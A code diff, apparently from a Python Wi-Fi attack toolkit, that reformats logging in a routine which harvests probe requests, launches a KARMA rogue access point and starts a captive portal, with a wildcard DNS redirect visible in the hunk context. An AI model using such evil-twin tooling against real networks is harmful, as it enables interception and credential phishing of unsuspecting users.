@@ -641,14 +641,22 @@ address=/#/10.0.0.1
         log: list[str] = []
 
         # Step 1: Harvest probes
-        log.append(f"[1/3] Harvesting probe requests on {interface} ({probe_duration}s)...")
+        log.append(
+            f"[1/3] Harvesting probe requests on {interface} ({probe_duration}s)..."
+        )
         probes = self.harvest_probes(interface, duration=probe_duration)
-        ssids_seen = [p.get("ssid", "") for p in probes.get("probes", []) if p.get("ssid")]
+        ssids_seen = [
+            p.get("ssid", "")
+            for p in probes.get("probes", [])
+            if p.get("ssid")
+        ]
         log.append(f"  Probes captured: {len(ssids_seen)} unique SSIDs")
 
         # Step 2: KARMA attack
         log.append("[2/3] Launching KARMA attack...")
-        karma = self.start_karma(interface, channel=channel, internet_iface=internet_iface)
+        karma = self.start_karma(
+            interface, channel=channel, internet_iface=internet_iface
+        )
         log.append(f"  KARMA status: {karma.get('status', 'unknown')}")
         time.sleep(3)
 
@@ -663,7 +671,9 @@ address=/#/10.0.0.1
             portal=portal,
             internet_iface=internet_iface,
         )
-        log.append(f"  Portal active — SSID: {ssid}, Gateway: {portal_result.get('gateway')}")
+        log.append(
+            f"  Portal active — SSID: {ssid}, Gateway: {portal_result.get('gateway')}"
+        )
 
         return {
             "status": "active",
